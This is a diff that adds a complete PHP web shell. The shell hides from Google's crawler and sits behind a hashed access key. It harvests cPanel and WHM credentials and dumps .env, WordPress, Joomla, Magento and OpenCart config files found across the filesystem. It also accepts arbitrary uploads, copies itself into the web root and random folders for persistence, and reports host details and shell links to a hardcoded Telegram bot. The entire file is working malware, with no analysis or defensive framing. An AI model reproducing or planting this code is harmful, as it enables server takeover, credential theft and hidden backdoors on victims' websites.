@@ -1,0 +1,447 @@
+<?php
+if (isset($_SERVER['HTTP_USER_AGENT']) && strpos($_SERVER['HTTP_USER_AGENT'], 'Google') !== false) {
+    header('HTTP/1.0 404 Not Found');
+    exit;
+}
+define('SOURCE_CODE_PATH', $_SERVER['SCRIPT_FILENAME']);
+
+function ambilkata($string, $start, $end) {
+    $startPos = strpos($string, $start);
+    if ($startPos === false) return '';
+    $startPos += strlen($start);
+    $endPos = strpos($string, $end, $startPos);
+    if ($endPos === false) return '';
+    return substr($string, $startPos, $endPos - $startPos);
+}
+
+if (!isset($_GET["raimu"]) || md5($_GET["raimu"]) !== '0055dcb19aa21b4b39bbec0e8e784bad') {
+    header('HTTP/1.1 403 Forbidden');
+    exit;
+}
+
+$user   = get_current_user();
+$asu    = shell_exec('cat /etc/named.conf | wc -l');
+$asu1   = shell_exec('cat /etc/passwd | wc -l');
+$ram    = shell_exec('grep MemTotal /proc/meminfo');
+$cpu    = shell_exec('nproc');
+$pkexec = shell_exec('pkexec --version');
+$free   = round(disk_free_space(".") / 1000000000);
+$total  = round(disk_total_space(".") / 1000000000);
+
+function scanFiles(array $patterns) {
+    $findCommand = "find / \\( ";
+    $conditions = [];
+    foreach ($patterns as $pattern) {
+        $conditions[] = "-name '" . $pattern . "'";
+    }
+    $findCommand .= implode(" -o ", $conditions);
+    $findCommand .= " \\) 2>/dev/null";
+    $filesFound = shell_exec($findCommand);
+    $filesFoundArray = array_filter(explode("\n", trim($filesFound)));
+    return $filesFoundArray;
+}
+
+function generateRandomString($length = 10) {
+    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $str = '';
+    for ($i = 0; $i < $length; $i++) {
+        $str .= $characters[random_int(0, strlen($characters) - 1)];
+    }
+    return $str;
+}
+
+function encode_data($data) {
+    return strrev(bin2hex(gzdeflate($data)));
+}
+
+function decode_data($data) {
+    return gzinflate(hex2bin(strrev($data)));
+}
+
+function log_shell($path) {
+    $log_file = 'etc';
+    $existing = [];
+    if (file_exists($log_file)) {
+        $encoded = file_get_contents($log_file);
+        if (!empty($encoded)) {
+            $decoded = decode_data($encoded);
+            $existing = array_filter(explode("\n", $decoded));
+        }
+    }
+    if (in_array($path, $existing)) {
+        return false;
+    } else {
+        $existing[] = $path;
+        $new_data = implode("\n", $existing) . "\n";
+        $encoded_new = encode_data($new_data);
+        file_put_contents($log_file, $encoded_new);
+        return true;
+    }
+}
+
+function send_telegram($text) {
+    $mbot = "https://api.telegram.org/bot7925066813:AAGC5p5cgRD7PS7-CuHUmY9kFZfs74FmuIU";
+    $params = [
+        'chat_id' => '-1002463886033',
+        'text'    => $text,
+    ];
+    $ch = curl_init($mbot . '/sendMessage');
+    curl_setopt($ch, CURLOPT_HEADER, false);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $result = curl_exec($ch);
+    curl_close($ch);
+}
+
+if (isset($_POST['adminer'])) {
+    $adminerUrl = "https://github.com/vrana/adminer/releases/download/v5.0.2/adminer-5.0.2.php";
+    $adminerContent = @file_get_contents($adminerUrl);
+    if ($adminerContent) {
+        $adminerPath = __DIR__ . "/adminer.php";
+        if (file_put_contents($adminerPath, $adminerContent)) {
+            $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
+            $currentDir = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/\\');
+            $adminerUrlLink = $scheme . "://" . $_SERVER['HTTP_HOST'] . $currentDir . "/adminer.php";
+            $adminerResult = "ADMINER downloaded: " . $adminerPath . "\nLink: " . $adminerUrlLink;
+        } else {
+            $adminerResult = "Failed to save ADMINER.";
+        }
+    } else {
+        $adminerResult = "Failed to download ADMINER from remote URL.";
+    }
+}
+
+if (isset($_POST['root_shell'])) {
+    $randomName = generateRandomString(10) . ".php";
+    $dest = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . "/" . $randomName;
+    if (!file_exists($dest)) {
+        $content = file_get_contents(SOURCE_CODE_PATH);
+        if ($content !== false && file_put_contents($dest, $content)) {
+            $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
+            $rootShellUrl = $scheme . "://" . $_SERVER['HTTP_HOST'] . "/" . $randomName;
+            $msg = "Shell uploaded in ROOT: " . $dest . "\nLink: " . $rootShellUrl;
+            if (log_shell($dest)) {
+                send_telegram($msg);
+            }
+            $rootShellResult = $msg;
+        } else {
+            $rootShellResult = "Failed to upload ROOT SHELL.";
+        }
+    } else {
+        $rootShellResult = "ROOT SHELL file already exists.";
+    }
+}
+
+if (isset($_POST['spawn_random_folder'])) {
+    $docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\');
+    $allItems = scandir($docRoot);
+    $dirs = [];
+    foreach ($allItems as $item) {
+        if ($item === '.' || $item === '..') continue;
+        $fullPath = $docRoot . "/" . $item;
+        if (is_dir($fullPath)) {
+            $dirs[] = $item;
+        }
+    }
+    $randomShells = [];
+    if (!empty($dirs)) {
+        // If there are at least 2 directories, pick 2; otherwise, pick all.
+        if(count($dirs) >= 2) {
+            $picked_keys = array_rand($dirs, 2);
+            // array_rand returns an array of keys if count >=2.
+            $picked = [$dirs[$picked_keys[0]], $dirs[$picked_keys[1]]];
+        } else {
+            $picked = $dirs;
+        }
+        foreach ($picked as $folder) {
+            $randomName = generateRandomString(10) . ".php";
+            $dest = $docRoot . "/" . $folder . "/" . $randomName;
+            $content = file_get_contents(SOURCE_CODE_PATH);
+            if ($content !== false && file_put_contents($dest, $content)) {
+                $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
+                $folderUrl = $scheme . "://" . $_SERVER['HTTP_HOST'] . "/" . $folder . "/" . $randomName;
+                $randomShells[] = "Shell uploaded in {$folder}: " . $dest . "\nLink: " . $folderUrl;
+                log_shell($dest);
+            }
+        }
+        if (!empty($randomShells)) {
+            $msg = implode("\n\n", $randomShells);
+            send_telegram($msg);
+            $spawnResult = $msg;
+        } else {
+            $spawnResult = "Failed to upload any shells in random folders.";
+        }
+    } else {
+        $spawnResult = "No directories found in document root.";
+    }
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>r00t@trenggalek6etar</title>
+    <style>
+        /* Dark/black theme with updated font colors */
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            margin: 0;
+            background: #000;
+            color: #ddd;
+        }
+        .container {
+            max-width: 1200px;
+            margin: auto;
+            text-align: center;
+        }
+        .info, .actions, .logs {
+            margin-bottom: 20px;
+            padding: 15px;
+            border: 1px solid #444;
+            border-radius: 5px;
+            text-align: left;
+            background: #111;
+        }
+        .actions form {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+        }
+        .actions input[type="submit"], .actions input[type="file"] {
+            padding: 10px 10px;
+            font-size: 15px;
+            cursor: pointer;
+            background: #222;
+            border: 1px solid #555;
+            color: #ddd;
+        }
+        .actions input[type="submit"]:hover, .actions input[type="file"]:hover {
+            background: #333;
+        }
+        @media (max-width: 600px) {
+            .actions form {
+                flex-direction: column;
+            }
+            .actions input[type="submit"] {
+                width: 100%;
+            }
+        }
+        a {
+            color: #4da6ff;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="info">
+        /etc/named.conf : <font color="#4dff4d"><?php echo htmlspecialchars($asu); ?></font><br>
+        /etc/passwd : <font color="#4dff4d"><?php echo htmlspecialchars($asu1); ?></font><br>
+        Memory : <font color="#4dff4d"><?php echo htmlspecialchars($ram); ?></font> - 
+        <font color="#4dff4d"><?php echo htmlspecialchars($cpu); ?></font><br>
+        Disk Usage (df -h): <font color="#4dff4d"><?php echo $total; ?> GB / <?php echo $free; ?> GB</font><br>
+        pkexec : <font color="#4dff4d"><?php echo htmlspecialchars($pkexec); ?></font><br>
+        <?php
+        $accesshashPath = '/home/' . $user . '/.accesshash';
+        if (file_exists($accesshashPath)) {
+            $whm = file_get_contents($accesshashPath);
+            $whm = preg_replace('/\s+/', '', $whm);
+            echo '<input type="text" size="30" value="WHM ' . htmlspecialchars($user) . ':' . htmlspecialchars($whm) . '"><br>';
+        }
+        $myCnfPath = '/home/' . $user . '/.my.cnf';
+        if (file_exists($myCnfPath)) {
+            $cp = file_get_contents($myCnfPath);
+            $cp = ambilkata($cp, 'password="', '"');
+            echo 'Cpanel : Username <font color="#4dff4d">(</font>' . htmlspecialchars($user) .
+                 '<font color="#4dff4d">)</font> Password <font color="#4dff4d">(</font>' . htmlspecialchars($cp) . '<font color="#4dff4d">)</font><br>';
+        }
+        echo 'uname -a : <font color="#ff4d4d">' . php_uname() . '</font><br>';
+        echo 'pwd : <font color="pink">' . getcwd() . '</font><br>';
+        ?>
+    </div>
+    <div class="actions">
+        <form method="post" enctype="multipart/form-data">
+            <input type="file" name="f">
+            <input type="submit" name="v" value="upload">
+        </form>
+        <?php
+        if (isset($_POST["v"]) && $_POST["v"] === "upload") {
+            if (isset($_FILES["f"]) && is_uploaded_file($_FILES["f"]["tmp_name"])) {
+                $uploadFile = $_FILES["f"]["name"];
+                if (@copy($_FILES["f"]["tmp_name"], $uploadFile)) {
+                    $fullPath = realpath($uploadFile);
+                    $docRoot = realpath($_SERVER['DOCUMENT_ROOT']);
+                    $scheme  = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
+                    if ($docRoot !== false && strpos($fullPath, $docRoot) === 0) {
+                        $relativePath = str_replace($docRoot, "", $fullPath);
+                        $relativePath = str_replace(DIRECTORY_SEPARATOR, "/", $relativePath);
+                        $webPath = $scheme . "://" . $_SERVER['HTTP_HOST'] . $relativePath;
+                    } else {
+                        $webPath = $scheme . "://" . $_SERVER['HTTP_HOST'] . "/" . $uploadFile;
+                    }
+                    echo "<b>Berhasil Cok --></b> <a href=\"" . htmlspecialchars($webPath) . "\" target=\"_blank\">" . htmlspecialchars($fullPath) . "</a>";
+                } else {
+                    echo "<b>Gagal Cok</b>";
+                }
+            } else {
+                echo "<b>No file uploaded</b>";
+            }
+        }
+        ?>
+    </div>
+    <br>
+    <div class="actions">
+        <form method="post">
+            <input type="submit" name="get_env" value="GET ENV"><br>
+            <input type="submit" name="get_wp" value="GET WORDPRESS"><br>
+            <input type="submit" name="get_joomla" value="GET JOOMLA & WHMCS"><br>
+            <input type="submit" name="get_magento" value="GET MAGENTO"><br>
+            <input type="submit" name="get_opencart" value="GET OPENCART">
+        </form>
+    </div>
+    <br>
+    <div class="actions">
+        <form method="post">
+            <input type="submit" name="adminer" value="ADMINER"><br>
+            <input type="submit" name="root_shell" value="SHELL ROOT"><br>
+            <input type="submit" name="spawn_random_folder" value="SHELL RANDOM">
+        </form>
+    </div>
+    <br>
+    <?php
+    $configScans = [
+        'get_env'      => ['.env'],
+        'get_wp'       => ['wp-config.php'],
+        'get_joomla'   => ['configuration.php'],
+        'get_magento'  => ['local.xml', 'env.php'],
+        'get_opencart' => ['Config.php']
+    ];
+    $selectedScan = null;
+    foreach ($configScans as $key => $patterns) {
+        if (isset($_POST[$key])) {
+            $selectedScan = $key;
+            break;
+        }
+    }
+    if ($selectedScan !== null) {
+        $patterns = $configScans[$selectedScan];
+        $filesFoundArray = scanFiles($patterns);
+        echo "<h3>Files Found for " . htmlspecialchars(strtoupper(str_replace('get_', '', $selectedScan))) . ":</h3>";
+        echo '<textarea name="file_list" cols="150" rows="10">';
+        if (!empty($filesFoundArray)) {
+            foreach ($filesFoundArray as $file) {
+                echo htmlspecialchars($file) . "\n";
+            }
+        } else {
+            echo "No matching files found.";
+        }
+        echo '</textarea><br>';
+        $outputContent = "";
+        foreach ($filesFoundArray as $file) {
+            if (is_readable($file)) {
+                $content = file_get_contents($file);
+                $outputContent .= "===== File: $file =====\n";
+                $outputContent .= $content . "\n\n";
+            } else {
+                $outputContent .= "===== File: $file is not readable =====\n";
+            }
+        }
+        echo '<textarea name="file_contents" cols="150" rows="10">';
+        echo htmlspecialchars($outputContent);
+        echo '</textarea><br>';
+    }
+    ?>
+    <br>
+    <div class="info">
+        <?php
+        if (isset($adminerResult)) {
+            echo "<h3>ADMINER</h3><pre>" . htmlspecialchars($adminerResult) . "</pre>";
+        }
+        if (isset($rootShellResult)) {
+            echo "<h3>ROOT SHELL</h3><pre>" . htmlspecialchars($rootShellResult) . "</pre>";
+        }
+        if (isset($spawnResult)) {
+            echo "<h3>SHELL RANDOM FOLDER</h3><pre>" . htmlspecialchars($spawnResult) . "</pre>";
+        }
+        ?>
+    </div>
+    <br>
+    <div class="logs">
+        <h3>Uploaded Shells Log</h3>
+        <?php
+        $log_file = 'etc';
+        if (file_exists($log_file)) {
+            $encoded = file_get_contents($log_file);
+            if (!empty($encoded)) {
+                $decoded = decode_data($encoded);
+                $shells = array_filter(explode("\n", $decoded));
+                if (!empty($shells)) {
+                    echo "<ul>";
+                    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
+                    foreach ($shells as $shellPath) {
+                        if (file_exists($shellPath)) {
+                            $docRoot = realpath($_SERVER['DOCUMENT_ROOT']);
+                            $shellReal = realpath($shellPath);
+                            if ($docRoot !== false && strpos($shellReal, $docRoot) === 0) {
+                                $relative = str_replace($docRoot, "", $shellReal);
+                                $relative = str_replace(DIRECTORY_SEPARATOR, "/", $relative);
+                                $url = $scheme . "://" . $_SERVER['HTTP_HOST'] . $relative;
+                            } else {
+                                $url = "#";
+                            }
+                            echo "<li><a href=\"" . htmlspecialchars($url) . "\" target=\"_blank\">" . htmlspecialchars($shellReal) . "</a></li>";
+                        } else {
+                            echo "<li>" . htmlspecialchars($shellPath) . " (Not available)</li>";
+                        }
+                    }
+                    echo "</ul>";
+                } else {
+                    echo "No shells logged.";
+                }
+            } else {
+                echo "No shells logged.";
+            }
+        } else {
+            echo "No shells logged.";
+        }
+        ?>
+    </div>
+    <br>
+    <?php
+    if (!file_exists('.tmp')) {
+        $sys    = php_uname();
+        $home   = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
+        $domen  = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : '';
+        $tempat = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
+        $ram    = shell_exec('grep MemTotal /proc/meminfo');
+        $cpu    = shell_exec('nproc');
+        $pkexec = shell_exec('pkexec --version');
+        $free   = round(disk_free_space(".") / 1000000000);
+        $total  = round(disk_total_space(".") / 1000000000);
+        $mbot = "https://api.telegram.org/bot7925066813:AAGC5p5cgRD7PS7-CuHUmY9kFZfs74FmuIU";
+        $params = [
+            'chat_id' => '-1002463886033',
+            'text'    => "Uname : $sys \r\nLokasi : $domen/$tempat \r\nDir : $home \r\n$ram / $cpu Disk : $total GB / $free GB \r\npkexec : $pkexec",
+        ];
+        $ch = curl_init($mbot . '/sendMessage');
+        curl_setopt($ch, CURLOPT_HEADER, false);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $result = curl_exec($ch);
+        curl_close($ch);
+        if ($m = fopen(".tmp", "w")) {
+            fwrite($m, "");
+            fclose($m);
+            chmod(".tmp", 0644);
+        }
+    }
+    ?>
+</div>
+</body>
+</html>
